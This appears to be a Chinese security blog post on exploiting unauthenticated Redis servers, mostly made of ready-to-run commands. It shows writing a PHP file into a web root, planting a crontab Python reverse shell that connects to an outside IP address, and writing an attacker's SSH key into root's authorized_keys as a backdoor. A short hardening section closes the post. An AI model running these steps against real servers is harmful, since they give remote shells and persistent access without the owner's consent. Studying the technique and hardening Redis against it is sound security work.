<html>

<head>
  <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Do Evil Via Redis Unauthorized Access | 3ND</title>
<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627826313347">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="Do Evil Via Redis Unauthorized Access | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="0x01 关于 Redis
REmote DIctionary Server(Redis) 是一个开源的使用 ANSIC 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的 API。它通常被称为数..." />
    <meta name="keywords" content="Summary,Redis" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
    <script src="/media/highlight.min.js"></script>
</head>

<body>
  <div class="main">
    <div class="main-content">
      <div class="site-header">
  <a href="https://3nd.xyz">
  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627826313347" alt="">
  </a>
  <h1 class="site-title">
    3ND
  </h1>
  <p class="site-description">
    夏が終わった
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    <a href="https://github.com/inspiringz" target="_blank">
      <i class="ri-github-fill"></i>
    </a>
    <a href="mailto:z@3nd.xyz" target="_blank">
      <i class="ri-mail-send-fill"></i>
  </a>
  <a href="#">
    <i class="ri-fire-fill"></i>
</a>
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              Do Evil Via Redis Unauthorized Access
            </h2>
            <div class="post-info">
              <span>
                2019-11-25
              </span>
              <span>
                10 min read
              </span>
              <span class="page-view" key="20191125165823" title="Do Evil Via Redis Unauthorized Access">
              </span>
              
                <a href="https://3nd.xyz/tag/summary/" class="post-tag">
                  # Summary
                </a>
                
                <a href="https://3nd.xyz/tag/redis/" class="post-tag">
                  # Redis
                </a>
                
            </div>
            
                <div class="post-content-wrapper">
                  <div class="post-content">
                    <h2 id="0x01-关于-redis">0x01 关于 Redis</h2>
<p>REmote DIctionary Server(Redis) 是一个开源的使用 ANSIC 语言编写、支持网络、可基于内存亦可<strong>持久化</strong>的日志型、Key-Value <strong>数据库</strong>，并提供多种语言的 API。它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
<p>Redis 是一个 NoSQL 的数据库(NoSQL 泛指<strong>非关系型</strong>的数据库,常用的 Mysql是关系型数据库)，数据通过键/值对存储在内存中。默认配置中，在服务运行的时候，会开放一个没有验证的 <strong>TCP/6379</strong> 端口，提供的这个接口是很 &quot;宽容&quot;。它会尝试去解析处理每一次输入(直到超时或者输 入 <code>QUIT</code> 命令退出)，对于那些不存在的命令，则会显示像 &quot;-ERR unknown command&quot; 这样的输出。</p>
<p>在运行时， Redis 以数据结构的形式将数据维持在内存中， 为了让这些数据在 Redis 重启之后仍然可用， Redis 分别提供了 RDB 和 AOF 两种持久化模式。</p>
<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/2019-11-25-17-18-48.png" alt="" loading="lazy"></figure>
<ol>
<li>
<p>RDB 将数据库的<strong>快照</strong>以二进制的方式保存到磁盘中。在 Redis 运行时， RDB 程序将当前内存中的数据库快照保存到磁盘文件中， 在 Redis 重启动时， RDB 程序可以通过载入 RDB 文件来还原数据库的状态。</p>
</li>
<li>
<p>AOF 则以协议文本的方式，将所有对数据库进行过写入的命令（及其参数）记录到 AOF 文件，以此达到记录数据库状态的目的。AOF 持久性会记录服务器接收的每个写入操作，这些操作将在服务器启动时再次重放，以重建原始数据集。 使用与 Redis 协议本身相同的格式记录命令，并且采用仅<strong>追加</strong>方式。当日志太大时，Redis 可以在后台重写日志。</p>
</li>
</ol>
<p>Redis 配置中几个关键项目：</p>
<pre><code class="language-xml">dir 指定的是 redis 的“工作路径”，之后生成的 RDB 和 AOF 文件都会存储在这里。
dbfilename RDB 文件名，默认为 “dump.rdb”
appendonly 是否开启 AOF
appendfilename AOF 文件名，默认为 “appendonly.aof”
appendfsync AOF 备份方式：always、everysec、no
</code></pre>
<p>我们可以通过指定 dir 和 dbfilename，执行 save / bgsave，即可实现任意文件的写入。Redis 默认的配置是使用 6379 端口且默认无密码，所以如果这个端口对公网开放时就很容易出问题，会导致未授权访问进而可利用 Redis 权限写文件：</p>
<ol>
<li>
<p>在 Redis 有 Web 目录写权限时，我们可以向 Web 应用绝对路径写入 Webshell；</p>
</li>
<li>
<p>在 Redis 以 root 权限运行时，我们可以通过写 Crontab 来执行命令反弹 shell 或吸入 ssh-keygen 公钥然后使用私钥登陆。</p>
</li>
</ol>
<h2 id="0x02-写-webshell">0x02 写 Webshell</h2>
<p>* Kali 下部署 Redis：</p>
<pre><code class="language-bash"># Download
wget http://download.redis.io/releases/redis-stable.tar.gz
# Decompression
tar -zxvf redis-stable.tar.gz
# Compile
cd redis-stable
make
# Run
cd src
./redis-server
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/2019-11-25-17-45-29.png" alt="" loading="lazy"></figure>
<pre><code class="language-bash">⚡root@Kali /home/redis-stable/src &gt; ./redis-cli
127.0.0.1:6379&gt; config set dir /var/www/html
OK
127.0.0.1:6379&gt; config set dbfilename redis.php
OK
127.0.0.1:6379&gt; set shell &quot;&lt;?php phpinfo(); ?&gt;&quot;
OK
127.0.0.1:6379&gt; save
OK
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/2019-11-25-17-57-55.png" alt="" loading="lazy"></figure>
<p>* 设置可远程访问：</p>
<pre><code class="language-bash"># 编辑 redis.conf
vim redis.conf
# 注释掉该IP地址，表示允许所有网络地址访问
bind 127.0.0.1
# 修改运行时不受保护
protected-mode no
# 修该为守护进程/后台程序（无需进行此操作，数据只会在后台运行时会保存，关闭将清空）
daemonize yes
# 启动
cd src
./redis-cli
# 修改运行时不受保护
config set protected-mode no
# 设置密码
config set requirepass password
# 密码登录
./redis-cli
auth password
</code></pre>
<h2 id="0x03-crontab-定时任务">0x03 Crontab 定时任务</h2>
<p>Crontab 命令常见于 Unix 和类 Unix 的操作系统之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于 <code>crontab</code> 文件中，以供之后读取和执行，定时任务在 Linux 中主要有 2 个地方体现：</p>
<ul>
<li>
<p><code>/etc/crontab</code>，只有 root 用户可以使用，使用时需 root 权限，而且必须指定运行用户。</p>
<pre><code class="language-bash">*/1  *  *  *  *  *  root /usr/sbin/ntpdate s1a.time.edu.cn &amp;&gt; /dev/null
</code></pre>
<blockquote>
<p>*（分） *（时） *（天） *（月）*（周）<br>
<code>/</code>（每）<code>-</code>（连续的时间）<code>,</code>（离散时间）<code>*</code>（所有都匹配）</p>
</blockquote>
<pre><code class="language-bash"># /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )

</code></pre>
</li>
<li>
<p><code>/var/spool/cron/$USER</code>，所有用户都可以使用，可以使用 <code>crontab -u username -e</code> 命令来直接编辑这个文件。</p>
<blockquote>
<ul>
<li>CentOS 的定时任务在 <strong>/var/spool/cron/root/</strong></li>
</ul>
</blockquote>
<ul>
<li>Ubuntu 的定时任务在 <strong>/var/spool/cron/crontabs/root/</strong></li>
<li>Ubuntu 用户定时任务必须在 600 权限才能执行</li>
<li>Ubuntu 不能使用 bash 反弹 shell</li>
</ul>
</li>
</ul>
<pre><code class="language-bash">(crontab -l;printf &quot;* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'\n&quot;)|crontab -
</code></pre>
<ul>
<li>
<p><code>crontab -</code> 将管道符前面的内容写入到当前用户的 crontab 文件里;</p>
</li>
<li>
<p><code>* * * * *</code> 表示每一分钟执行该命令，等同于 <code>*/1 * * * *</code>.</p>
</li>
</ul>
<p>如果是 ubuntu 的 root 权限，以上命令会写到 <code>/var/spool/cron/crontabs/root</code> 文件；如果是 centos 的 root 权限，以上命令则会写到 <code>/var/spool/cron/root</code> 文件。</p>
<pre><code class="language-bash">echo -e  &quot;\n\n* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;47.98.224.70\&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'\n\n&quot; | ./redis-cli -h 127.0.0.1 -x set shell
</code></pre>
<h2 id="0x04-ssh-后门植入">0x04 SSH 后门植入</h2>
<p>本地生成 ssh 秘钥:</p>
<pre><code class="language-bash">⚡root@Kali  ~/桌面 &gt; ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Created directory '/root/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:o//N3gbnXInV5hhN+wZp438tnL6A6AoDSBmMGOPuf88 root@Kali
The key's randomart image is:
+---[RSA 3072]----+
|*o               |
|+oo             .|
| +             +o|
|o.            *o+|
|...     S    ooBo|
|.  .   . o ...+.=|
| .  o . . . .* =.|
|  .  +.o   o oB +|
|   .. oEo...+o+o.|
+----[SHA256]-----+
</code></pre>
<p>取出公钥：</p>
<pre><code class="language-bash">⚡root@Kali  ~/.ssh &gt; cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGIfblo3aG879O1+EpZFO2TKzCuy7nVW/jNcGCr/sX0lzvmZuGvxB4cAqbBHi0mvEXZu85kmodyhgD3BZltzifTy0wOr3vtyxjea/r4K+i+OyxGTrtXWkqaEtIhPg2aIifGSdwPhc5hpIC1L9FyNiAA9l7gKt2J/IWxmAYkfCPL56j/7W2DHgX822Pfv7Ib3dtFZJ3l60ziWgpfLWRL8Th+04JfvhgnZGFYBKhTROu4RnrHPdrPg+yzIFXMRpJWb1qrsXnsw5pg5g3mmHs9P5BjG1fLkLQ0H2XyF8wY8QNFVOqFahk99ApNWA6QLoW92ZuZH9cibcXoB2l1Xspxf77/QUAjwIdga5jLtJ5vvmf0qBvbdSIwtBp1ZE57EN58uqahWee6vXWMzUSOD17ynwbK9j/QQOWdC/CUBxmYBp9grMVz2AgbdfpI28Z64KAUWHNUAalstRDXxdJ9XFsBhAN2UBUd9x9wCi2OUVhUleiTNepY38pfk9v0NAkb3eNDn0= root@Kali
</code></pre>
<p>写入 Redis ：</p>
<pre><code class="language-bash">config set dir /root/.ssh/
config set dbfilename authorized_keys
set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGIfblo3aG879O1+EpZFO2TKzCuy7nVW/jNcGCr/sX0lzvmZuGvxB4cAqbBHi0mvEXZu85kmodyhgD3BZltzifTy0wOr3vtyxjea/r4K+i+OyxGTrtXWkqaEtIhPg2aIifGSdwPhc5hpIC1L9FyNiAA9l7gKt2J/IWxmAYkfCPL56j/7W2DHgX822Pfv7Ib3dtFZJ3l60ziWgpfLWRL8Th+04JfvhgnZGFYBKhTROu4RnrHPdrPg+yzIFXMRpJWb1qrsXnsw5pg5g3mmHs9P5BjG1fLkLQ0H2XyF8wY8QNFVOqFahk99ApNWA6QLoW92ZuZH9cibcXoB2l1Xspxf77/QUAjwIdga5jLtJ5vvmf0qBvbdSIwtBp1ZE57EN58uqahWee6vXWMzUSOD17ynwbK9j/QQOWdC/CUBxmYBp9grMVz2AgbdfpI28Z64KAUWHNUAalstRDXxdJ9XFsBhAN2UBUd9x9wCi2OUVhUleiTNepY38pfk9v0NAkb3eNDn0= root@Kali\n\n\n&quot;
save
</code></pre>
<pre><code class="language-bash">ssh -i id_rsa root@host
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/2019-11-26-18-41-21.png" alt="" loading="lazy"></figure>
<h2 id="0x05-修复建议">0x05 修复建议</h2>
<p>1. 禁止一些高危命令。修改 <code>redis.conf</code> 文件，添加如下选项来禁用远程修改 dir/dbfilename。</p>
<pre><code class="language-bash">rename-command FLUSHALL &quot;&quot;
rename-command CONFIG &quot;&quot;
rename-command EVAL &quot;&quot;
</code></pre>
<p>2. 以低权限运行 Redis 服务。为 Redis 创建单独的用户和家目录，并配置禁止登陆。</p>
<pre><code class="language-bash">groupadd -r redis &amp;&amp; useradd -r -g redis redis
</code></pre>
<p>3. 为 Redis 添加密码验证。修改 redis.conf ，添加：</p>
<pre><code class="language-bash">requirepass mypassword
</code></pre>
<p>4. 禁止外网访问 Redis。修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用：</p>
<pre><code class="language-bash">bind 127.0.0.1
</code></pre>
<p>5. 保证 <code>authorized_keys</code> 文件的安全。为保证安全，阻止其他用户添加新的公钥。将 <code>authorized_keys</code> 的权限设置为对拥有者只读，其他用户没有任何权限：</p>
<pre><code class="language-bash">chmod 400 ~/.ssh/authorized_keys
</code></pre>
<p>为保证 authorized_keys 的权限不会被改掉，还可以设置该文件的 <code>immutable</code> 位权限：</p>
<pre><code class="language-bash">chattr +i ~/.ssh/authorized_keys
</code></pre>
<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：</p>
<pre><code class="language-bash">chattr +i ~/.ssh
</code></pre>
<p>*<strong>注</strong>：如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>
<p>6. 设置防火墙策略。</p>
<p>- <strong>参考</strong> -</p>
<p>[1] <a href="https://www.secpulse.com/archives/5366.html">Trying to hack Redis via HTTP requests</a></p>
<p>[2] <a href="https://joychou.org/hostsec/linux-crontab-rebound-shell-hole.html">Linux Crontab定时任务反弹shell的坑</a></p>
<p>[3] <a href="https://0verwatch.top/redis-vul.html">redis未授权访问漏洞一些利用 - 0verwatch</a></p>

                  </div>
                  <div class="toc-container">
                    <div style="position: sticky;
                    top: 20px;">
                    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#0x01-%E5%85%B3%E4%BA%8E-redis">0x01 关于 Redis</a></li>
<li><a href="#0x02-%E5%86%99-webshell">0x02 写 Webshell</a></li>
<li><a href="#0x03-crontab-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1">0x03 Crontab 定时任务</a></li>
<li><a href="#0x04-ssh-%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5">0x04 SSH 后门植入</a></li>
<li><a href="#0x05-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x05 修复建议</a></li>
</ul>
</li>
</ul>

                  </div>
                  </div>
                </div>
          </article>
        </div>

        
          <div class="nearby-post" style="padding: 24px 32px;">
            <div class="prev-post" style="float: left;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter;text-align: left;">上一篇</div>
              <a href="https://3nd.xyz/post/2019-11-27-Do-Evil-Things-With-Gopher/">
                <h3 class="post-title" style="text-align: left;">
                  Do Evil Things With Gopher://
                </h3>
              </a>
            </div>
            <div class="next-posts" style="float: right;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter; text-align: right;">下一篇</div>
              <a href="https://3nd.xyz/post/2019-11-25-PHP无参数实现RCE/">
                <h3 class="post-title" style="
                text-align: right;">
                  PHP 无参数实现 RCE - boring_code
                </h3>
              </a>
            </div>
          </div>
          

                

                                <div class="site-footer">
  
  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

    </div>
  </div>

  <script>
    hljs.highlightAll();

    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

    // This should probably be throttled.
    // Especially because it triggers during smooth scrolling.
    // https://lodash.com/docs/4.17.10#throttle
    // You could do like...
    // window.addEventListener("scroll", () => {
    //    _.throttle(doThatStuff, 100);
    // });
    // Only not doing it here to keep this Pen dependency-free.

    window.addEventListener("scroll", event => {
      let fromTop = window.scrollY;

      mainNavLinks.forEach((link, index) => {
        let section = document.getElementById(decodeURI(link.hash).substring(1));
        let nextSection = null
        if (mainNavLinks[index + 1]) {
          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
        }
        if (section.offsetTop <= fromTop) {
          if (nextSection) {
            if (nextSection.offsetTop > fromTop) {
              link.classList.add("current");
            } else {
              link.classList.remove("current");
            }
          } else {
            link.classList.add("current");
          }
        } else {
          link.classList.remove("current");
        }
      });
    });
  </script>
<script src="/media/view-support.js"></script>
<script>
  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
    var pageview = window.pageview(AV, {
      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
      appClass: 'Gridea',
    });
    $('.page-view').each(function () {
      var $this = $(this);
      var key = $this.attr('key');
      var title = $this.attr('title');
      pageview.increase(key, title, function(view) {
        $("[key='" + key +"']").text(view+' views');
      });
    });
  });
</script>

</body>

</html>